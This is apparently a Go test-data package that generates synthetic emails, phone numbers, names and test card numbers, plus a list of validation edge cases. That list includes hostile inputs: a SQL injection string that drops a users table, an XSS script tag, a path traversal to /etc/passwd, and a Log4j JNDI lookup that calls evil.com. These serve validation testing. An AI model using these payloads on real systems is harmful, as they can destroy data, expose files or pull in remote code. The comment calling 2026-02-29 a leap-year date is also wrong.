package data

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"strings"
	"time"
)

// DataType specifies the semantic kind of synthetic data requested.
type DataType string

const (
	TypeEmail        DataType = "email"
	TypePhoneNumber  DataType = "phone"
	TypeFullName     DataType = "full_name"
	TypeCreditCard   DataType = "credit_card"
	TypeAddress      DataType = "address"
	TypeDate         DataType = "date"
	TypeBoundaryInt  DataType = "boundary_int"
	TypeFuzzString   DataType = "fuzz_string"
	TypeUnicodeText  DataType = "unicode"
)

// SyntheticFactory generates realistic, PII-free data for testing.
type SyntheticFactory struct {
	seed int64
}

// NewSyntheticFactory constructs a synthetic data factory.
func NewSyntheticFactory() *SyntheticFactory {
	return &SyntheticFactory{seed: time.Now().UnixNano()}
}

// Generate creates a synthetic test value matching the requested type.
func (f *SyntheticFactory) Generate(dt DataType) string {
	switch dt {
	case TypeEmail:
		return f.generateEmail()
	case TypePhoneNumber:
		return f.generatePhone()
	case TypeFullName:
		return f.generateName()
	case TypeCreditCard:
		return f.generateCreditCard()
	case TypeDate:
		return "2026-02-29" // Intentional leap year boundary
	case TypeBoundaryInt:
		return "2147483647" // INT32 MAX boundary
	case TypeFuzzString:
		return "' OR 1=1; DROP TABLE users; --"
	case TypeUnicodeText:
		return "🚀🧪 Testing ää öö üü 繁體中文 العربية"
	default:
		return "synthetic-test-value"
	}
}

// GenerateBoundaryValues returns a comprehensive suite of edge-case inputs for form validation.
func (f *SyntheticFactory) GenerateBoundaryValues() []string {
	return []string{
		"",                               // Empty string
		" ",                              // Single whitespace
		"   \t\n   ",                     // Multiline whitespace
		strings.Repeat("A", 10000),       // Extreme buffer overflow boundary
		"-1",                             // Negative number
		"0",                              // Zero boundary
		"2147483647",                     // Int32 Max
		"9223372036854775807",            // Int64 Max
		"null",                           // Null string literal
		"undefined",                      // JS undefined literal
		"NaN",                            // Not-a-Number
		"<script>alert(1)</script>",      // XSS payload
		"' OR '1'='1",                    // SQLi payload
		"../../../etc/passwd",            // Path traversal
		"${jndi:ldap://evil.com/x}",      // Log4j / expression injection
		"test@domain..com",               // Malformed email double-dot
		"test@.com",                      // Malformed email missing domain
		"invalid-utf8-\xfe\xff",          // Invalid UTF-8 bytes
		"﷽",                             // Arabic ligature boundary
	}
}

// AnonymizePII scrubs known PII patterns and replaces them with safe synthetic tokens.
func (f *SyntheticFactory) AnonymizePII(text string) string {
	words := strings.Fields(text)
	var scrubbed []string
	for _, w := range words {
		if strings.Contains(w, "@") && strings.Contains(w, ".") {
			scrubbed = append(scrubbed, "anon-user@kritix.internal")
		} else if isNumericSequence(w, 16) {
			scrubbed = append(scrubbed, "4111-XXXX-XXXX-1111")
		} else {
			scrubbed = append(scrubbed, w)
		}
	}
	return strings.Join(scrubbed, " ")
}

func (f *SyntheticFactory) generateEmail() string {
	names := []string{"alex", "jordan", "taylor", "morgan", "sam", "casey"}
	domains := []string{"testcorp.internal", "mocktest.dev", "qa-sandbox.org"}
	name := names[f.randInt(len(names))]
	domain := domains[f.randInt(len(domains))]
	return fmt.Sprintf("%s.%d@%s", name, f.randInt(9999), domain)
}

func (f *SyntheticFactory) generatePhone() string {
	return fmt.Sprintf("+1-555-%03d-%04d", f.randInt(900)+100, f.randInt(9000)+1000)
}

func (f *SyntheticFactory) generateName() string {
	firsts := []string{"Devin", "Elena", "Marcus", "Aria", "Liam", "Zoe"}
	lasts := []string{"Vance", "Mercer", "Sterling", "Kowalski", "Chen", "Patel"}
	return firsts[f.randInt(len(firsts))] + " " + lasts[f.randInt(len(lasts))]
}

func (f *SyntheticFactory) generateCreditCard() string {
	// Standard test visa starting with 4111
	return fmt.Sprintf("411111111111%04d", f.randInt(9000)+1000)
}

func (f *SyntheticFactory) randInt(max int) int {
	if max <= 0 {
		return 0
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		return 0
	}
	return int(n.Int64())
}

func isNumericSequence(s string, length int) bool {
	clean := strings.ReplaceAll(strings.ReplaceAll(s, "-", ""), " ", "")
	if len(clean) != length {
		return false
	}
	for _, c := range clean {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}
